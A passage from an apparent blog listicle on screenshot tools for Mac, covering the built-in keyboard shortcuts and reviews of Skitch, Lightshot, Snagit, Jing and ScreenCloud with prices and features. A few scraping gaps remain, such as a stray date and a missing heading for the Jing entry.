utility that features various screen capture modes and markup tools. On Mac, we have many applications that have the same functions and do even more (for free).</p><p>In this article, I will firstly show you how to use the default snipping tool on Mac – you can do a lot without installing an additional software. </p><p>Then, if you want a snipping tool that has more features, I will show you the list of 10 apps for capturing and marking up screenshots for your Mac.</p><h2>How to use the built-in snipping tool on Mac</h2><p>Before we dive into the best alternatives to snipping tool for Mac, we would want to give you a bit of a background on how to use your Mac’s default utility.</p><p>There are actually a couple of keyboard shortcuts to bring out your device’s screen capture tool. Just make sure that you have enabled your print screen key shortcuts <g>under:</g><strong>System Preferences</strong> &gt; <strong>Keyboard</strong> &gt; <strong>Shortcuts</strong> &gt; <strong>Screenshots</strong>.</p><ul><li>To capture the whole screen, hit <strong>command + shift + 3</strong>.</li><li>To capture a part of the screen, hit <strong>command + shift + 4 </strong>/ To cancel hit<strong> esc</strong></li><li>To capture an active window, hit <strong>command + shift + 4 + space bar</strong>.</li></ul><p>Capturing a screen or a window automatically saves your screenshot on your desktop in PNG format.

We’ve broken down the 10 best Snipping Tools for Mac devices.</p><h3>1. Skitch – Editor’s choice</h3><p><strong>Price: Free [</strong><strong>Download</strong><strong>]</strong></p><p>Whether you want to use a snipping tool at home, at school, at work, or at events, as long as you are looking for a cool, fun, and attractive way to screenshot stuff, Skitch could not be a better choice. And because it is visually striking, Skitch can be a great tool to inspire you to save big ideas you find on the vast internet or share them with friends, colleagues, and family.</p><p>If you happen to be an Evernote fan, Skitch is a fancy snipping tool for Mac that you can add to your arsenal. Its selling point is the app’s ability to take a screenshot, make annotations, and save it on Evernote. However, it requires a premium Evernote account for you to take advantage of the of the PDF markup feature.</p><p>Your Skitch screenshots can be easily added to your desktop’s Photos, whiled editing Skitch images using extensions from Photos are also available. Its drag-and-drop feature also comes in handy for easy transfer and sharing of files.</p><h3>2. Lightshot</h3><p><strong>Price: Free [</strong><strong>Download</strong><strong>]</strong></p><p>Lightshot is a personal favorite of mine merely because it gets the job done without you shelling out a dime. Its interface looks plain and simple and works pretty straightforward, so it is the best option if you are looking for a no-frills snipping tool for Mac.</p><p>Its editing options include a pen, line, arrow, rectangle, marker, and text. In addition, Lightshot supports one-click uploading to prntscr.com, image searching, and social sharing. And of course, it has a copy and save buttons as well. Lightshot, however, does not have a free-form shape.</p><p>You can trigger Lightshot by hitting the print screen key on your keyboard. For your convenience, you can assign a hotkey for this snipping tool. On top of all these, Lightshot allows you to customize its output, including the file format of the screenshot and inclusion of the cursor in the shot.</p><h3>3. Snagit</h3><p><strong>Price: $49.95 [</strong><strong>Download</strong><strong>]</strong></p><p>Snagit is a premium full-featured screen capture tool developed by TechSmith Corporation, one of the industry-leading software companies based in the United States. As a premium software, Snagit provides the most advanced functionalities that you will only find in the best snipping tools for Mac.</p><p>Of course, it has all the basic functionalities of a snipping tool for Mac. That on top of its advanced image editing ability, allowing you to build custom graphics with text, highlights, arrows, and more. It also has a shortened URL in case you intend to share your screenshots and screen recordings over your social media accounts or via email.</p><p>Not only does Snagit has a screenshot function, but it also has a screencast feature that allows you to video-record your screen. Screen recording lets you capture your Mac’s full-screen desktop, a certain region on your screen, a window, or even when scrolling.</p><p>Snagit is the perfect choice for those who are in the business of creating video tutorials, training materials, and documentation. However, this best-in-class snipping tool for Mac does not come without a hefty price tag. If you are on the fence, try it free for 15 days.</p><p>Nov 27, 2017.

Since it comes at no cost to you, Jing offers only the basic elements of a snipping tool in editing, like adding lines, arrows, and texts. You can either save your screenshots on your Mac or upload it to screencast.com.</p><p>Unlike Lightshot and some other free snipping tools for Mac though, Jing allows you to record your screen for 5 minutes or less, which is pretty nifty if you are going to use it for short, rough and ready video tutorials and documentation.</p><p>However, TechSmith might retire Jing soon in 2019 as it is on track to release a new, free snipping tool for Mac and other operating systems.</p><h3>5. ScreenCloud</h3><p><strong>Price: Free [</strong><strong>Download</strong><strong>]</strong></p><p>ScreenCloud is another simple yet unique snipping tool that is available as a desktop app and as a browser extension.

However, the browser-based tool is restricted to snipping the screen only when the browser is in use. </p><p>ScreenCloud is too basic compared to the other free snipping tools for Mac. But if you are working with a team and are constantly using Safari, Chrome, Firefox, or other browsers, ScreenCloud is a great option.</p><h3>6.
